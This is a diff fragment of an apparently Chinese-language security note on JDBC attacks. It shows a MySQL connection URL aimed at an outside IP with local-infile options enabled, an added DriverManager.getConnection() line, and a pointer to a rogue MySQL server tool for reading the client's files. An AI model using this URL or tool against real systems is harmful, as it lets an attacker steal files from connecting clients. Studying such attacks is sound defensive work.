@@ -10,6 +10,9 @@ test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#
 jdbc:mysql://47.109.58.205:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#
 root
 password
+
+代码：
+DriverManager.getConnection();
 ```
 可以使用下方的项目伪造一个mysql服务，从而读取客户端的文件。
 <https://github.com/rmb122/rogue_mysql_server>
